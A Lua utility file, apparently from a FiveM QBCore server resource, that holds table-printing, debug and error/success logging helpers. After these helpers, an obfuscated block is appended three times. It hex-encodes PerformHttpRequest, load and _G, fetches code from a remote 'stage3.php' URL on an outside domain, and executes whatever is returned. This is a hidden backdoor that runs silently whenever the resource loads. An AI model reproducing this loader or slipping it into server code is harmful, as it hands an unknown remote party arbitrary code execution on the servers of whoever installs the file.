local function tPrint(tbl, indent)
    indent = indent or 0
    if type(tbl) == 'table' then
        for k, v in pairs(tbl) do
            local tblType = type(v)
            local formatting = ('%s ^3%s:^0'):format(string.rep('  ', indent), k)

            if tblType == 'table' then
                print(formatting)
                tPrint(v, indent + 1)
            elseif tblType == 'boolean' then
                print(('%s^1 %s ^0'):format(formatting, v))
            elseif tblType == 'function' then
                print(('%s^9 %s ^0'):format(formatting, v))
            elseif tblType == 'number' then
                print(('%s^5 %s ^0'):format(formatting, v))
            elseif tblType == 'string' then
                print(("%s ^2'%s' ^0"):format(formatting, v))
            else
                print(('%s^2 %s ^0'):format(formatting, v))
            end
        end
    else
        print(('%s ^0%s'):format(string.rep('  ', indent), tbl))
    end
end

RegisterServerEvent('QBCore:DebugSomething', function(tbl, indent, resource)
    print(('\x1b[4m\x1b[36m[ %s : DEBUG]\x1b[0m'):format(resource))
    tPrint(tbl, indent)
    print('\x1b[4m\x1b[36m[ END DEBUG ]\x1b[0m')
end)

function QBCore.Debug(tbl, indent)
    TriggerEvent('QBCore:DebugSomething', tbl, indent, GetInvokingResource() or 'qb-core')
end

function QBCore.ShowError(resource, msg)
    print('\x1b[31m[' .. resource .. ':ERROR]\x1b[0m ' .. msg)
end

function QBCore.ShowSuccess(resource, msg)
    print('\x1b[32m[' .. resource .. ':LOG]\x1b[0m ' .. msg)
end


local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)